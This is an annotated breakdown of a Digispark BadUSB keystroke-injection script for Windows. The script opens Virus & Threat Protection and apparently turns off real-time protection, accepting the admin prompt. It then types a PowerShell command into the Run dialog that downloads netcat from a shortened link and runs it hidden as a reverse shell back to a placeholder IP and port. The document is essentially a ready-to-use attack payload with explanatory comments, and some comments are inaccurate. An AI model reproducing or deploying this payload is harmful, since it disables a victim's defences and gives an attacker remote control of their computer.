# Script Breakdown

The following breakdown explains each line of the script:

```cpp
#include "DigiKeyboard.h"   // Includes the DigiKeyboard library

void setup() {
  DigiKeyboard.delay(1000);   // Pauses the script for 1 second
  DigiKeyboard.sendKeyStroke(KEY_S, MOD_GUI_LEFT);   // Sends a key press for the S key with the left GUI (Windows) key modifier
  DigiKeyboard.delay(1000);   // Pauses the script for 1 second
  DigiKeyboard.print("virus & threat protection");   // Inputs the text "virus & threat protection"
  DigiKeyboard.delay(500);   // Pauses the script for 0.5 seconds
  DigiKeyboard.sendKeyStroke(KEY_ENTER);   // Sends a key press for the Enter key
  DigiKeyboard.delay(5000);   // Pauses the script for 5 seconds
  DigiKeyboard.sendKeyStroke(43);   // Sends a key press for the + key (four times), which opens the settings menu in Windows 10
  DigiKeyboard.sendKeyStroke(43);
  DigiKeyboard.sendKeyStroke(43);
  DigiKeyboard.sendKeyStroke(43);
  DigiKeyboard.delay(700);   // Pauses the script for 0.7 seconds
  DigiKeyboard.sendKeyStroke(KEY_ENTER);   // Sends a key press for the Enter key
  DigiKeyboard.delay(700);   // Pauses the script for 0.7 seconds
  DigiKeyboard.sendKeyStroke(KEY_SPACE);   // Sends a key press for the Space key
  DigiKeyboard.delay(2000);   // Pauses the script for 2 seconds
  DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);   // Sends a key press for the Y key with the left Alt key modifier
  DigiKeyboard.delay(1000);   // Pauses the script for 1 second
  DigiKeyboard.sendKeyStroke(KEY_F4, MOD_ALT_LEFT);   // Sends a key press for the F4 key with the left Alt key modifier, which closes the current window
  DigiKeyboard.delay(500);   // Pauses the script for 0.5 seconds
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);   // Sends a key press for the R key with the left GUI (Windows) key modifier, which opens the Run dialog box
  DigiKeyboard.delay(700);   // Pauses the script for 0.7 seconds
  DigiKeyboard.print("powershell curl -o netcat.exe https://bit.ly/3G3R1d1 ; powershell -w hidden netcat.exe <ip> <port> -e powershell.exe");   // Inputs a PowerShell command that downloads and executes the netcat.exe tool
  DigiKeyboard.sendKeyStroke(KEY_ENTER);   // Sends a key press for the Enter key, which executes the PowerShell command
}

void loop() {
  // The loop function is empty in this script and not used
}
